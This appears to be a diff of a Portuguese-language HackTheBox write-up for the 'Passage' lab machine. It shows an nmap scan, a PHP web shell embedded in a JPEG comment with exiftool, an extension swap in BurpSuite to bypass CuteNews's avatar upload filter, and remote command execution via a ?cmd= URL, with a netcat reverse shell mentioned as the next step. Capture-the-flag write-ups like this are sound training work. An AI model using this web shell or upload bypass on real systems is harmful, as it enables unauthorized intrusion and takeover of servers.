@@ -11,22 +11,23 @@ Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)
 Passage - HackTheBox - WriteUp
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ![Image](https://i.imgur.com/9iTXQiJ.png)
+Machine Maker: [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851)
 
 
-• Nessa máquina vamos utilizar a falha Arbitrary File Upload utilizando uma técnica de enviar uma imagem com um código PHP dentro dela, e assim nos possibilitando a execução de código remoto.
+• Nessa máquina vamos utilizar a falha [Arbitrary File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) utilizando uma técnica de enviar uma imagem com um código PHP dentro dela através da ediçaõ da requisição e assim nos possibilitando a execução de código remoto.
 
 
 **Tools** utilizadas:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 nmap
 exiftool
-john
+john the ripper
 BurpSuite
 netcat
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-
+nmap -v -sS -Pn -A passage.htb
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
@@ -64,12 +65,13 @@ HOP RTT       ADDRESS
 2   189.09 ms passage.htb (10.10.10.206)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Podemos ver duas portas abertas, a 22(SSH) e a 80(HTTP).
 
 Ao acessar a porta 80, nos deparamos com um website.
 ![Image](https://i.imgur.com/grJc9Zf.png)
 
 
-Ao analisar o código fonte, podemos perceber que o site está utilizando um CMS chamado 'CuteNews'.
+Ao analisar o código fonte, podemos perceber que o site está utilizando um CMS(Sistema de gerenciamento de conteúdo) chamado 'CuteNews'.
 ![Image](https://i.imgur.com/ETMGKo8.png)
 
 
@@ -81,17 +83,17 @@ Como não temos credenciais válidas, vamos tentar realizar a criação de um no
 ![Image](https://i.imgur.com/ipJ8Q6W.png)
 
 
-Após conseguirmos o acesso inicial no CMS, podemos encontrar um campo de Upload de arquivos na página de edição do perfil do usuário, portanto, podemos tentar fazer o upload de um arquivo malicioso (:
+Após conseguirmos o acesso inicial no CMS, podemos encontrar um campo de Upload de avatar na página de edição do perfil do usuário, portanto, podemos tentar fazer o upload de um arquivo malicioso. (:
 ![Image](https://i.imgur.com/crQgsxz.png)
 
 
-Tentamos primeiro fazer upload de arquivos em php, porém, não foi possivel subir um arquivo com esta extensão...
+Tentamos primeiro fazer upload de arquivos em PHP, porém, não foi possivel subir um arquivo com esta extensão...
 Como é um campo de upload de 'Avatar' podemos deduzir que o campo aceitará imagens, então, vamos inserir um código malicioso dentro de nossa imagem. 
 Para isso vamos utilizar o exiftool:
 
 ![Image](https://i.imgur.com/yECy7Qo.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-exiftool -Comment='<?php echo "<pre>"; system($_GET['chu']); ?>' chu.jpeg;
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' chu.jpeg;
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Podemos conferir que conseguimos escrever o comentário dentro da imagem:
@@ -101,7 +103,7 @@ exiftool chu.jpeg
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora vamos tentar fazer o upload.
-Primeiro vamos ligar o BurpSuite para interceptar a requisição
+Primeiro vamos ligar o BurpSuite(proxy) para interceptar a requisição e edita-la.
 ![Image](https://i.imgur.com/SsZQS3v.png)
 
 No burp podemos ver a extensão que está sendo enviada (.jpeg)
@@ -110,7 +112,7 @@ No burp podemos ver a extensão que está sendo enviada (.jpeg)
 Vamos altera-la para .php e encaminhar a requisição
 ![Image](https://i.imgur.com/gO1W4Nl.png)
 
-Podemos perceber que a requisição foi bem sucedida
+Podemos perceber que a requisição foi bem sucedida(200)
 
 ![Image](https://i.imgur.com/0CZunKi.png)
 
@@ -124,7 +126,7 @@ Com isso temos uma execução de código remoto :D
 http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=id
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Ao pesquisar pelo nc, podemos ver que ele está instalado, portanto, vamos tentar utiliza-lo.
+Ao pesquisar pelo nc, podemos ver que ele está instalado, portanto, vamos tentar utiliza-lo para receber uma reverse shell.
 ![Image](https://i.imgur.com/5NgSWmB.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=whereis nc
